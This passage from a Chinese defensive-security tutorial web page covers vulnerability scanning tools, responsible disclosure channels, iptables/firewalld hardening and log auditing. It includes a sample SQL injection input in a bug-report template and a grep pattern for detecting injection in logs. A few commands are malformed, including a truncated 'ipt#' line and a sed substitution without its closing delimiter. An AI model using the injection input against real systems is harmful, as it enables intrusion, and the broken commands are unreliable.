+https://127.0.0.1:9392
+# 5. 扫描步骤：
+#    a. 登录后，点击【Targets】→【New Target】，添加目标IP/域名（自身合法资产）；
+#    b. 点击【Tasks】→【New Task】，选择目标和扫描策略（推荐【Full and fast】快速全面扫描）；
+#    c. 点击【Start】启动扫描，等待扫描完成（根据目标规模，时间从几分钟到几小时不等）；
+#    d. 扫描完成后，点击【Reports】查看扫描报告，漏洞按风险等级分类（High/Medium/Low/Info）；
+#    e. 根据报告中的【Solution】修复漏洞，修复后重新扫描验证效果。
+                </pre>
+                <h4>3. Nikto（Web服务器专用扫描器）</h4>
+                <p>Nikto是Kali自带的Web服务器漏洞扫描器，可检测Web服务器的配置漏洞、过时软件版本、恶意文件、高危目录，实操指令带注释：</p>
+                <pre>
+# 基础扫描Web服务器（指定目标IP/域名+端口）
+nikto -h http://192.168.1.100:80
+# 扫描HTTPS服务器
+nikto -h https://192.168.1.100:443
+# 保存扫描报告（-o指定文件名，-F指定格式：html/txt/csv）
+nikto -h http://192.168.1.100 -o nikto_scan.html -F html
+# 扫描指定目录
+nikto -h http://192.168.1.100 -g /admin/,/upload/,/backup/
+# 扫描结果分析：重点关注【Vulnerable】标注的漏洞，如过时的Apache/Nginx版本、开放的后台目录、未授权的文件访问
+                </pre>
+                <h4>4. OWASP ZAP（Web应用专用漏洞扫描器，开发者友好）</h4>
+                <p>OWASP ZAP是Kali自带的开源Web应用安全扫描器，专注于Web漏洞检测（SQL注入、XSS、CSRF、文件上传等），适合Web开发者和安全测试人员，实操步骤带注释：</p>
+                <pre>
+# 1. 启动OWASP ZAP（Kali终端）
+zaproxy
+# 2. 基础扫描步骤：
+#    a. 启动后，在【Quick Start】中输入目标URL（自身合法Web应用，如http://192.168.1.100）；
+#    b. 选择【Attack】模式，点击【Attack】启动自动扫描；
+#    c. ZAP会自动爬取Web应用的所有页面，并检测其中的漏洞；
+#    d. 扫描完成后，在【Alerts】面板查看漏洞，按风险等级分类（High/Medium/Low/Info）；
+#    e. 点击每个漏洞，查看【Description】（描述）、【Solution】（修复方案），根据方案修复；
+#    f. 生成扫描报告：点击【Report】→【Generate Report】，选择格式（HTML/PDF），保存报告。
+# 3. 高级扫描：手动爬取页面后，对指定URL进行主动扫描，精准检测漏洞。
+                </pre>
+                <h4>5. Dirb（Web目录扫描器，发现隐藏目录/文件）</h4>
+                <p>Dirb是Kali自带的Web目录扫描器，通过字典暴力破解Web服务器的隐藏目录和文件，发现未授权的后台、备份文件、配置文件，实操指令带注释：</p>
+                <pre>
+# 基础目录扫描（-u指定目标，-w指定字典，Kali自带字典/usr/share/wordlists/dirb/）
+dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt
+# 扫描HTTPS服务器
+dirb https://192.168.1.100 /usr/share/wordlists/dirb/common.txt
+# 保存扫描结果（-o指定文件名）
+dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt -o dirb_scan.txt
+# 自定义字典扫描
+dirb http://192.168.1.100 /root/my_dict.txt
+# 扫描结果分析：重点关注状态码为200（存在）、301（重定向）的目录/文件，如/admin、/backup、/config.php
+                </pre>
+                <h3>三、漏洞扫描结果分析与修复流程（核心）</h3>
+                <ol>
+                    <li><strong>漏洞分级</strong>：将扫描出的漏洞按风险等级分为高危、中危、低危、信息，优先修复高危漏洞（如远程代码执行、SQL注入、未授权访问）；</li>
+                    <li><strong>漏洞验证</strong>：对扫描出的漏洞进行手动验证，排除误报（扫描工具可能存在误报，需实际测试确认）；</li>
+                    <li><strong>制定修复方案</strong>：根据漏洞类型，制定针对性修复方案（如升级软件版本、配置防火墙、修改代码、强化权限）；</li>
+                    <li><strong>执行修复</strong>：在测试环境验证修复方案后，再部署到生产环境，避免修复导致业务中断；</li>
+                    <li><strong>重新扫描</strong>：修复完成后，使用相同的扫描工具重新扫描目标，确认漏洞已修复；</li>
+                    <li><strong>记录归档</strong>：将扫描报告、修复方案、验证结果归档，形成安全档案，便于后续追溯和审计。</li>
+                </ol>
+            </div>
+
+            <!-- 漏洞提交规范 -->
+            <div class="tutorial-section" id="submit">
+                <button class="collect-btn" data-id="tutorial_6" data-title="漏洞提交规范"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-paper-plane"></i> 漏洞提交规范（合法渠道，附官方平台地址）</h2>
+                <div class="tip-info">
+                    <strong>重要提示</strong>：发现漏洞后，应通过厂商官方漏洞响应渠道提交，严禁利用漏洞牟利、破坏系统或公开漏洞细节，符合条件的可申请厂商漏洞奖励（VRP）。
+                </div>
+                <h3>一、漏洞提交前提条件</h3>
+                <ul>
+                    <li>确认漏洞属于目标厂商的产品/服务，非第三方改造或配置问题；</li>
+                    <li>已验证漏洞的真实性，能稳定复现，避免误报；</li>
+                    <li>未利用漏洞获取敏感数据、破坏系统、谋取私利；</li>
+                    <li>遵守厂商的漏洞响应规则（如披露期限、提交格式）。</li>
+                </ul>
+                <h3>二、漏洞报告核心要素（一份合格的报告=快速处理）</h3>
+                <p>一份完整的漏洞报告需包含以下8大要素，信息越详细，厂商处理速度越快，<strong>附模板示例</strong>：</p>
+                <ol>
+                    <li><strong>漏洞标题</strong>：简洁明了，含漏洞类型+产品+风险等级，示例：【高危】阿里云ECS某版本远程代码执行漏洞；</li>
+                    <li><strong>漏洞等级</strong>：参考CVSS评分标准，分为高危/中危/低危/信息，标注CVSS分数（如CVSS 9.8/高危）；</li>
+                    <li><strong>影响范围</strong>：受影响的产品版本、部署环境、用户群体，示例：阿里云ECS CentOS 7.9 64位版本，未升级内核的用户；</li>
+                    <li><strong>复现环境</strong>：复现漏洞所需的环境，示例：Kali Linux 2024.1 + Chrome 120 + 目标IP 192.168.1.100；</li>
+                    <li><strong>复现步骤</strong>：详细、可落地的操作步骤，分点描述，示例：1. 访问http://192.168.1.100/test.php；2. 输入参数?id=1' OR 1=1--；3. 页面返回所有用户数据；</li>
+                    <li><strong>漏洞证明</strong>：截图、数据包、视频、日志等证据，清晰展示漏洞现象，示例：附SQL注入漏洞复现截图+Burp数据包；</li>
+                    <li><strong>修复建议</strong>：具体、可执行的修复方案，示例：1. 将SQL语句改为参数化查询；2. 对用户输入进行过滤和编码；3. 安装WAF拦截SQL注入请求；</li>
+                    <li><strong>联系方式</strong>：邮箱、电话、QQ等，便于厂商沟通和发放奖励，示例：邮箱：admin@fengye.com，QQ：123456789。</li>
+                </ol>
+                <h3>三、国内合法漏洞提交渠道（官方平台，全收录）</h3>
+                <h4>1. 国家层面漏洞平台</h4>
+                <ul>
+                    <li>国家信息安全漏洞共享平台（CNVD）：<a href="https://www.cnvd.org.cn" target="_blank">https://www.cnvd.org.cn</a>（国家级漏洞库，提交通用型漏洞）；</li>
+                    <li>国家信息安全漏洞库（CNNVD）：<a href="https://www.cnnvd.org.cn" target="_blank">https://www.cnnvd.org.cn</a>（军工、政务类漏洞优先提交）；</li>
+                    <li>国家网络与信息安全信息通报中心：<a href="https://www.cert.org.cn" target="_blank">https://www.cert.org.cn</a>（重大漏洞、零日漏洞提交）。</li>
+                </ul>
+                <h4>2. 头部互联网厂商漏洞响应平台（VRP，有奖励）</h4>
+                <ul>
+                    <li>阿里云安全应急响应中心（ASRC）：<a href="https://asrc.alibaba.com" target="_blank">https://asrc.alibaba.com</a>（阿里云产品/生态漏洞，奖励现金/礼品）；</li>
+                    <li>腾讯安全应急响应中心（TSRC）：<a href="https://security.tencent.com/tsrc" target="_blank">https://security.tencent.com/tsrc</a>（腾讯产品/生态漏洞，奖励现金/腾讯周边）；</li>
+                    <li>百度安全应急响应中心（BSRC）：<a href="https://bsrc.baidu.com" target="_blank">https://bsrc.baidu.com</a>（百度产品/生态漏洞，奖励现金/百度周边）；</li>
+                    <li>字节跳动安全应急响应中心（Bytedance SRC）：<a href="https://security.bytedance.com" target="_blank">https://security.bytedance.com</a>（抖音/头条/西瓜等产品漏洞，奖励现金）；</li>
+                    <li>京东安全应急响应中心（JSRC）：<a href="https://security.jd.com" target="_blank">https://security.jd.com</a>（京东产品/生态漏洞，奖励现金/京东卡）；</li>
+                    <li>美团安全应急响应中心（MSRC）：<a href="https://security.meituan.com" target="_blank">https://security.meituan.com</a>（美团产品/生态漏洞，奖励现金/美团卡）。</li>
+                </ul>
+                <h4>3. 传统企业/运营商漏洞平台</h4>
+                <ul>
+                    <li>中国移动安全应急响应中心：<a href="https://security.10086.cn" target="_blank">https://security.10086.cn</a>；</li>
+                    <li>中国电信安全应急响应中心：<a href="https://security.10000.com" target="_blank">https://security.10000.com</a>；</li>
+                    <li>中国联通安全应急响应中心：<a href="https://security.10010.com" target="_blank">https://security.10010.com</a>；</li>
+                    <li>华为安全应急响应中心（HW SRC）：<a href="https://security.huawei.com" target="_blank">https://security.huawei.com</a>。</li>
+                </ul>
+                <h3>四、漏洞提交注意事项（避坑指南）</h3>
+                <ul>
+                    <li><strong>不泄露漏洞细节</strong>：在厂商修复漏洞前，不向第三方公开漏洞复现方法、POC/EXP，避免漏洞被恶意利用；</li>
+                    <li><strong>不威胁厂商</strong>：严禁以漏洞为由向厂商索要钱财、提出不合理要求，否则涉嫌敲诈勒索，触犯刑法；</li>
+                    <li><strong>配合厂商修复</strong>：厂商核实漏洞时，及时提供必要的技术支持，协助厂商复现和修复漏洞；</li>
+                    <li><strong>遵守披露规则</strong>：厂商未修复漏洞前，不擅自公开漏洞；若厂商超过约定披露期限（一般30-90天）未修复，可通过官方渠道公开；</li>
+                    <li><strong>保留提交证据</strong>：保存漏洞提交的截图、邮件、平台记录，便于后续追溯和领取奖励；</li>
+                    <li><strong>拒绝黑市交易</strong>：严禁将漏洞出售给黑市、黑客组织，此类行为属于违法犯罪，将受到法律严惩。</li>
+                </ul>
+                <h3>五、漏洞奖励计划（VRP）参与指南</h3>
+                <p>多数厂商推出了漏洞奖励计划（VRP），提交有效漏洞可获得现金、礼品、荣誉证书等奖励，参与规则如下：</p>
+                <ul>
+                    <li>仅接受合法提交的漏洞，禁止通过恶意攻击、社会工程学等方式获取漏洞；</li>
+                    <li>漏洞需为未公开的0day/1day漏洞（厂商未发现、未修复的漏洞）；</li>
+                    <li>奖励金额根据漏洞的风险等级、影响范围、利用难度确定，高危漏洞奖励一般在几百到几万元不等，重大零日漏洞奖励可达数十万元；</li>
+                    <li>遵守厂商VRP的保密协议，不泄露漏洞信息、奖励金额等内容；</li>
+                    <li>部分厂商设置了漏洞等级奖励标准，可在厂商SRC平台查看，提交前需仔细阅读。</li>
+                </ul>
+            </div>
+
+            <!-- 防火墙配置教程（Linux） -->
+            <div class="tutorial-section" id="firewall">
+                <button class="collect-btn" data-id="tutorial_7" data-title="防火墙配置教程（Linux）"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-shield"></i> 防火墙配置教程（Linux，iptables/firewalld实操版）</h2>
+                <div class="tip-success">
+                    <strong>核心价值</strong>：防火墙是Linux服务器的第一道安全防线，通过配置防火墙规则，可过滤非法网络流量、封禁恶意IP、限制端口访问，从网络层防护服务器安全。
+                </div>
+                <h3>一、iptables防火墙配置（Linux通用，最基础）</h3>
+                <p>iptables是Linux系统自带的核心防火墙工具，基于包过滤技术，可配置入站/出站/转发规则，以下为实操指令，带详细注释，<strong>所有指令需在root权限下执行</strong>：</p>
+                <h4>1. iptables基础命令（查看/清空/保存规则）</h4>
+                <pre>
+# 查看所有iptables规则（-L列出规则，-n数字格式显示，-v详细信息）
+iptables -L -n -v
+# 查看指定链的规则（如INPUT链，入站规则）
+iptables -L INPUT -n -v
+# 清空所有iptables规则（-F清空，-X删除自定义链）
+iptables -F
+iptables -X
+# 重置默认策略（默认允许所有流量，可改为DROP）
+iptables -P INPUT ACCEPT
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+# 保存iptables规则（Debian/Ubuntu）
+iptables-save > /etc/iptables/rules.v4
+# 保存iptables规则（CentOS 6及以下）
+service iptables save
+# 恢复iptables规则
+iptables-restore < /etc/iptables/rules.v4
+# 设置iptables开机自启（Debian/Ubuntu）
+systemctl enable netfilter-persistent
+# 设置iptables开机自启（CentOS 6及以下）
+chkconfig iptables on
+                </pre>
+                <h4>2. iptables常用规则配置（基础防护，必配）</h4>
+                <pre>
+# 1. 允许回环接口（lo），保证服务器本地通信，禁止则服务器无法正常运行
+iptables -A INPUT -i lo -j ACCEPT
+# 2. 允许已建立的连接和相关连接，保证合法用户正常访问
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+# 3. 允许SSH端口（22，若修改为2222则替换为2222）
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+# 4. 允许HTTP（80）和HTTPS（443）端口，Web服务器必配
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+# 5. 允许Ping（ICMP）请求，可选，禁止则他人无法Ping通服务器
+iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
+# 6. 拒绝所有其他入站流量（核心，只允许上述放行的流量）
+iptables -P INPUT DROP
+iptables -P FORWARD DROP
+# 7. 允许所有出站流量，服务器可正常访问外部网络
+iptables -P OUTPUT ACCEPT
+# 保存规则，使配置永久生效
+iptables-save > /etc/iptables/rules.v4
+                </pre>
+                <h4>3. iptables高级规则配置（强化防护，推荐）</h4>
+                <pre>
+# 1. 限制单IP的SSH连接数（最多5个，防止SSH暴力破解）
+iptables -A INPUT -p tcp --dport 22 -m connlimit --connlimit-above 5 -j DROP
+# 2. 限制单IP的HTTP请求频率（每秒最多20个，防止CC攻击）
+iptables -A INPUT -p tcp --dport 80 -m limit --limit 20/s --limit-burst 40 -j ACCEPT
+iptables -A INPUT -p tcp --dport 80 -j DROP
+# 3. 封禁特定恶意IP（单个IP）
+iptables -A INPUT -s 192.168.1.xxx -j DROP
+# 4. 封禁特定IP段（如192.168.1.0/24，/24表示子网掩码255.255.255.0）
+iptables -A INPUT -s 192.168.1.0/24 -j DROP
+# 5. 解封指定IP（删除对应的DROP规则，先查看规则编号：iptables -L INPUT -n --line-numbers）
+ipt# 解封指定IP（删除对应的DROP规则，先查看规则编号：iptables -L INPUT -n --line-numbers）
+iptables -D INPUT 8 # 8为规则编号，替换为实际编号
+# 6. 记录DROP的流量到系统日志（便于分析攻击）
+iptables -A INPUT -j LOG --log-prefix "IPTABLES_DROP: " --log-level 4
+# 7. 限制单IP的ICMP请求频率（每秒最多5个，防止ICMP洪水攻击）
+iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 5/s --limit-burst 10 -j ACCEPT
+iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
+# 8. 禁止特定端口的出站流量（如禁止服务器访问外部22端口，防止被作为肉鸡）
+iptables -A OUTPUT -p tcp --dport 22 -j DROP
+# 9. 只允许特定IP访问MySQL端口（3306，数据库安全加固）
+iptables -A INPUT -p tcp --dport 3306 -s 192.168.1.100 -j ACCEPT # 仅允许192.168.1.100访问
+iptables -A INPUT -p tcp --dport 3306 -j DROP # 拒绝其他所有IP访问
+# 保存高级规则
+iptables-save > /etc/iptables/rules.v4
+                </pre>
+                <h4>4. iptables规则备份与恢复（迁移/故障恢复）</h4>
+                <pre>
+# 备份当前iptables规则到文件
+iptables-save > /root/iptables_backup_$(date +%Y%m%d).rules
+# 从备份文件恢复规则
+iptables-restore < /root/iptables_backup_20240520.rules
+# 恢复后保存，确保永久生效
+iptables-save > /etc/iptables/rules.v4
+                </pre>
+                <h3>二、firewalld防火墙配置（CentOS 7+/RHEL 7+，新一代工具）</h3>
+                <p>firewalld是CentOS 7及以上版本默认的防火墙管理工具，支持动态规则配置（无需重启服务）、区域管理，操作更简洁，以下为实操指令，带详细注释：</p>
+                <h4>1. firewalld基础命令（启动/停止/状态）</h4>
+                <pre>
+# 启动firewalld服务
+systemctl start firewalld
+# 停止firewalld服务
+systemctl stop firewalld
+# 重启firewalld服务
+systemctl restart firewalld
+# 查看firewalld状态（running为运行中）
+systemctl status firewalld
+# 设置firewalld开机自启
+systemctl enable firewalld
+# 禁止firewalld开机自启
+systemctl disable firewalld
+# 查看firewalld已启用的区域（默认public区域）
+firewall-cmd --get-active-zones
+# 查看默认区域
+firewall-cmd --get-default-zone
+# 设置默认区域为public
+firewall-cmd --set-default-zone=public
+                </pre>
+                <h4>2. firewalld常用规则配置（基础防护）</h4>
+                <pre>
+# 1. 允许SSH服务（永久生效，--permanent表示永久规则，需reload生效）
+firewall-cmd --add-service=ssh --permanent
+# 2. 允许HTTP服务（80端口）
+firewall-cmd --add-service=http --permanent
+# 3. 允许HTTPS服务（443端口）
+firewall-cmd --add-service=https --permanent
+# 4. 开放自定义端口（如8080/tcp，Web应用常用）
+firewall-cmd --add-port=8080/tcp --permanent
+# 5. 开放端口范围（如1000-2000/tcp）
+firewall-cmd --add-port=1000-2000/tcp --permanent
+# 6. 允许Ping（ICMP请求）
+firewall-cmd --add-icmp-block-inversion --permanent
+firewall-cmd --add-icmp-type=echo-request --permanent
+# 7. 重新加载规则，使永久规则生效
+firewall-cmd --reload
+# 8. 查看已配置的规则（永久规则）
+firewall-cmd --list-all --permanent
+# 9. 查看当前生效的规则（临时+永久）
+firewall-cmd --list-all
+                </pre>
+                <h4>3. firewalld高级规则配置（强化防护）</h4>
+                <pre>
+# 1. 封禁特定IP（永久生效）
+firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.1.xxx" reject' --permanent
+# 2. 封禁IP段（如192.168.2.0/24）
+firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.2.0/24" reject' --permanent
+# 3. 解封特定IP
+firewall-cmd --remove-rich-rule='rule family="ipv4" source address="192.168.1.xxx" reject' --permanent
+# 4. 只允许特定IP访问MySQL端口（3306）
+firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.1.100" port protocol="tcp" port="3306" accept' --permanent
+firewall-cmd --add-rich-rule='rule family="ipv4" port protocol="tcp" port="3306" reject' --permanent
+# 5. 限制单IP的连接数（如SSH端口最多5个连接）
+firewall-cmd --add-rich-rule='rule family="ipv4" port protocol="tcp" port="22" limit value="5/m" accept' --permanent
+firewall-cmd --add-rich-rule='rule family="ipv4" port protocol="tcp" port="22" reject' --permanent
+# 6. 配置端口转发（如将80端口转发到8080端口）
+firewall-cmd --add-forward-port=port=80:proto=tcp:to-port=8080 --permanent
+# 7. 禁止出站特定端口（如禁止访问外部22端口）
+firewall-cmd --add-rich-rule='rule family="ipv4" port protocol="tcp" port="22" outbound reject' --permanent
+# 重新加载规则生效
+firewall-cmd --reload
+                </pre>
+                <h4>4. firewalld区域管理（多场景适配）</h4>
+                <p>firewalld通过区域划分不同安全级别，常用区域：public（公共网络，默认）、internal（内部网络，信任度高）、dmz（非军事区，如服务器），配置示例：</p>
+                <pre>
+# 1. 查看所有区域
+firewall-cmd --get-zones
+# 2. 为网卡分配区域（如eth0分配到dmz区域）
+firewall-cmd --zone=dmz --add-interface=eth0 --permanent
+# 3. 查看dmz区域的规则
+firewall-cmd --zone=dmz --list-all --permanent
+# 4. 为dmz区域开放HTTP/HTTPS服务
+firewall-cmd --zone=dmz --add-service=http --permanent
+firewall-cmd --zone=dmz --add-service=https --permanent
+# 重新加载规则
+firewall-cmd --reload
+                </pre>
+                <h3>三、防火墙配置注意事项（避坑指南）</h3>
+                <ul>
+                    <li>配置前备份当前规则，避免误配置导致服务器无法访问（尤其是远程SSH连接时）；</li>
+                    <li>远程配置防火墙时，先确保SSH端口已放行，再设置默认策略为DROP，防止被踢下线；</li>
+                    <li>firewalld和iptables不可同时启用，CentOS 7+推荐使用firewalld，兼容性更好；</li>
+                    <li>规则配置后务必保存（iptables-save/firewall-cmd --reload），否则重启服务/服务器后规则失效；</li>
+                    <li>定期审计防火墙规则，删除无用规则，避免规则过多导致性能下降或冲突；</li>
+                    <li>生产环境建议结合云防火墙（如阿里云/腾讯云云防火墙），实现多层防护。</li>
+                </ul>
+            </div>
+
+            <!-- 日志审计教程 -->
+            <div class="tutorial-section" id="audit">
+                <button class="collect-btn" data-id="tutorial_8" data-title="日志审计教程"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-file-text"></i> 日志审计教程（Linux/Windows，安全分析核心）</h2>
+                <div class="tip-success">
+                    <strong>核心价值</strong>：日志是服务器安全的"黑匣子"，通过审计系统日志、应用日志，可追溯攻击行为、发现异常操作、定位安全事件根源，是安全应急响应和日常防护的关键环节。
+                </div>
+                <h3>一、Linux系统日志位置与类型（核心日志文件）</h3>
+                <p>Linux系统日志集中存储在/var/log目录下，不同日志对应不同功能，以下为核心日志文件说明：</p>
+                <ul>
+                    <li><strong>/var/log/auth.log</strong>（Debian/Ubuntu）/<strong>/var/log/secure</strong>（CentOS/RHEL）：认证日志，记录SSH登录、sudo操作、用户认证等关键信息，暴力破解、非法登录等行为会在此留下痕迹；</li>
+                    <li><strong>/var/log/syslog</strong>（Debian/Ubuntu）：系统综合日志，记录内核、系统服务、应用程序的运行日志，涵盖范围最广；</li>
+                    <li><strong>/var/log/messages</strong>（CentOS/RHEL）：系统核心日志，类似syslog，记录系统关键事件；</li>
+                    <li><strong>/var/log/apache2/</strong>（Apache）/<strong>/var/log/nginx/</strong>（Nginx）：Web服务器日志，包含access.log（访问日志）和error.log（错误日志），记录所有HTTP/HTTPS请求；</li>
+                    <li><strong>/var/log/mysql/</strong>：MySQL数据库日志，包含error.log（错误日志）、slow.log（慢查询日志）、general.log（通用查询日志）；</li>
+                    <li><strong>/var/log/cron</strong>：定时任务日志，记录crontab任务的执行情况，防止恶意定时任务（如挖矿程序）；</li>
+                    <li><strong>/var/log/boot.log</strong>：系统启动日志，记录服务器启动过程中的事件，可排查启动故障。</li>
+                </ul>
+                <h3>二、Linux日志分析工具实操（grep/awk/sed，基础必备）</h3>
+                <p>通过命令行工具快速分析日志，定位关键信息，以下为高频实操指令，带详细注释：</p>
+                <h4>1. grep（日志关键词搜索，最常用）</h4>
+                <pre>
+# 1. 搜索SSH登录失败记录（CentOS：/var/log/secure，Debian：/var/log/auth.log）
+grep "Failed password" /var/log/auth.log
+# 2. 搜索SSH登录成功记录
+grep "Accepted password" /var/log/auth.log
+# 3. 搜索特定IP的所有操作记录（如192.168.1.xxx）
+grep "192.168.1.xxx" /var/log/auth.log
+# 4. 搜索Web服务器的404错误（Nginx）
+grep " 404 " /var/log/nginx/access.log
+# 5. 搜索Web服务器的SQL注入特征请求（如union select）
+grep -i "union.*select" /var/log/nginx/access.log
+# 6. 统计SSH登录失败次数
+grep "Failed password" /var/log/auth.log | wc -l
+# 7. 搜索近24小时的日志（结合find）
+find /var/log -name "auth.log" -exec grep "Failed password" {} \; | grep "$(date +%b\ %d)"
+# 8. 实时监控日志（-f实时跟踪）
+tail -f /var/log/auth.log | grep "Failed password"
+                </pre>
+                <h4>2. awk（日志格式化分析，提取关键字段）</h4>
+                <pre>
+# 1. 统计Web服务器访问量最高的前10个IP（Nginx access.log，$1为IP字段）
+awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -10
+# 2. 统计Web服务器访问量最高的前10个URL（$7为URL字段）
+awk '{print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -10
+# 3. 统计Web服务器不同HTTP状态码的数量（$9为状态码字段）
+awk '{print $9}' /var/log/nginx/access.log | sort | uniq -c | sort -nr
+# 4. 提取SSH登录失败的IP和时间（$1为月份，$2为日期，$3为时间，$11为IP）
+awk '/Failed password/ {print $1, $2, $3, $11}' /var/log/auth.log
+# 5. 统计每个IP的SSH登录失败次数
+awk '/Failed password/ {print $11}' /var/log/auth.log | sort | uniq -c | sort -nr
+# 6. 提取Web服务器中响应时间超过1秒的请求（假设$10为响应时间字段）
+awk '$10 > 1.0 {print $1, $7, $10}' /var/log/nginx/access.log
+                </pre>
+                <h4>3. sed（日志内容替换/过滤，辅助分析）</h4>
+                <pre>
+# 1. 替换日志中的敏感信息（如将IP替换为***）
+sed 's/192.168.1.xxx/***.***.***.***' /var/log/nginx/access.log
+# 2. 删除日志中的空行
+sed '/^$/d' /var/log/auth.log
+# 3. 提取日志中包含"Accepted password"的行，并保存到文件
+sed -n '/Accepted password/p' /var/log/auth.log > ssh_success.log
+# 4. 替换日志中的日期格式（如将"May 20"改为"2024-05-20"）
+sed 's/May 20/2024-05-20/' /var/log/auth.log
+                </pre>
+                <h4>4. logrotate（日志轮转，防止日志过大）</h4>
+                <p>日志文件会不断增大，占用大量磁盘空间，logrotate可自动切割、压缩、删除旧日志，配置示例（Nginx日志轮转）：</p>
+                <pre>
+# 1. 查看logrotate配置文件位置
+ls /etc/logrotate.d/
+# 2. 编辑Nginx日志轮转配置（/etc/logrotate.d/nginx）
+vim /etc/logrotate.d/nginx
+# 3. 配置内容（带注释）
+/var/log/nginx/*.log {
+    daily                # 每天轮转一次
+    rotate 7             # 保留7天的日志
+    compress             # 压缩旧日志（.gz格式）
+    delaycompress        # 延迟压缩（保留最近一次未压缩日志）
+    missingok            # 日志文件不存在时不报错
+    notifempty           # 日志为空时不轮转
+    create 0640 www-data adm  # 创建新日志文件，权限0640，属主www-data:adm
+    postrotate           # 轮转后执行的命令（重新加载Nginx，使新日志生效）
+        if [ -f /var/run/nginx.pid ]; then
+            kill -USR1 `cat /var/run/nginx.pid`
+        fi
+    endscript
+}
+# 4. 手动执行日志轮转（测试配置）
+logrotate -f /etc/logrotate.d/nginx
+                </pre>
+                <h3>三、Windows系统日志审计（事件查看器，图形化操作）</h3>
+                <p>Windows系统通过"事件查看器"审计日志，核心日志类型：安全日志、系统日志、应用程序日志，实操步骤：</p>
+                <ol>
+                    <li>打开事件查看器：按下Win+R，输入<code>eventvwr.msc</code>，回车；</li>
+                    <li>核心日志路径：
+                        <ul>
+                            <li>Windows日志→安全：记录用户登录/注销、文件访问、权限变更等安全事件，事件ID对应不同行为（如4625=登录失败，4624=登录成功）；</li>
+                            <li>Windows日志→系统：记录系统服务启动/停止、硬件故障、驱动问题等；</li>
+                            <li>Windows日志→应用程序：记录应用程序运行错误、警告等。</li>
+                        </ul>
+                    </li>
+                    <li>筛选关键事件：
+                        <ul>
+                            <li>安全日志筛选登录失败：右键"安全"→"筛选当前日志"→事件ID输入4625→确定，可查看所有登录失败记录；</li>
+                            <li>安全日志筛选登录成功：事件ID输入4624；</li>
+                            <li>搜索特定IP：在筛选器中添加"远程IP地址"条件，输入目标IP。</li>
+                        </ul>
+                    </li>
+                    <li>导出日志：右键日志→"将事件另存为"，选择格式（.evtx/.csv/.txt），便于后续分析。</li>
+                </ol>
+                <h3>四、日志监控与告警（自动化，实时响应）</h3>
+                <p>手动分析日志效率低，通过工具实现自动化监控和告警，实操方案：</p>
+                <h4>1. fail2ban（Linux，自动封禁异常IP）</h4>
+                <p>fail2ban通过监控日志，发现异常行为（如SSH多次登录失败）后自动封禁IP，配置示例：</p>
+                <pre>
+# 1. 安装fail2ban（Debian/Ubuntu）
+apt install fail2ban -y
+# CentOS/RHEL
+yum install fail2ban -y
+# 2. 配置fail2ban（/etc/fail2ban/jail.local）
+vim /etc/fail2ban/jail.local
+# 3. 核心配置（带注释）
+[DEFAULT]
+bantime = 3600          # 封禁时间，单位秒（3600=1小时）
+findtime = 600           # 检测时间窗口，单位秒（600=10分钟）
+maxretry = 5             # 最大失败次数（10分钟内失败5次封禁）
+backend = auto           # 日志读取方式，自动适配
+destemail = admin@fengye.com  # 告警邮件接收地址
+sendername = fail2ban-alert  # 发件人名称
+mta = sendmail           # 邮件发送方式（需安装sendmail）
+
+[sshd]                   # SSH服务防护
+enabled = true           # 启用该规则
+port = ssh,2222          # SSH端口（多个端口用逗号分隔）
+filter = sshd            # 日志过滤规则（内置sshd规则）
+logpath = /var/log/auth.log  # 监控的日志文件（Debian/Ubuntu）
+# CentOS/RHEL替换为logpath = /var/log/secure
+
+[nginx-404]              # Nginx 404错误防护（防止扫描）
+enabled = true
+filter = nginx-404       # 自定义过滤规则（需创建/etc/fail2ban/filter.d/nginx-404.conf）
+logpath = /var/log/nginx/access.log
+maxretry = 20            # 10分钟内404错误超过20次封禁
+bantime = 1800           # 封禁30分钟
+
+# 4. 创建nginx-404过滤规则（/etc/fail2ban/filter.d/nginx-404.conf）
+[Definition]
+failregex = ^<HOST> .* "GET .*" 404 .*$
+ignoreregex =
+# 5. 启动fail2ban并设置开机自启
+systemctl start fail2ban
+systemctl enable fail2ban
+# 6. fail2ban常用命令
+fail2ban-client status          # 查看整体状态
+fail2ban-client status sshd     # 查看sshd规则状态（封禁的IP）
+fail2ban-client set sshd unbanip 192.168.1.xxx  # 解封特定IP
+                </pre>
+                <h4>2. ELK Stack（企业级日志分析平台）</h4>
+                <p>ELK Stack（Elasticsearch+Logstash+Kibana）是企业级日志分析平台，支持海量日志收集、存储、分析、可视化，适合中大型服务器集群，核心流程：</p>
+                <ol>
+                    <li>Logstash：收集服务器日志（通过Filebeat代理），过滤、格式化日志数据；</li>
+                    <li>Elasticsearch：存储日志数据，提供高效检索；</li>
+                    <li>Kibana：可视化日志数据，创建仪表盘、设置告警规则（如SSH登录失败超过10次触发邮件告警）。</li>
+                </ol>
+                <h3>五、日志审计核心场景与分析思路</h3>
+                <h4>1. 场景1：SSH暴力破解分析</h4>
+                <pre>
+# 1. 查看暴力破解IP和次数
+awk '/Failed password/ {print $11}' /var/log/auth.log | sort | uniq -c | sort -nr | head -5
+# 2. 查看破解使用的用户名
+awk '/Failed password/ {print $1, $2, $3, $9, $11}' /var/log/auth.log
+# 3. 封禁恶意IP（iptables/fail2ban）
+iptables -A INPUT -s 192.168.1.xxx -j DROP
+# 4. 加固措施：修改SSH端口、禁用密码登录、启用双因素认证
+                </pre>
+                <h4>2. 场景2：Web服务器被攻击分析（SQL注入/XSS）</h4>
+                <pre>
+# 1. 搜索包含SQL注入特征的请求
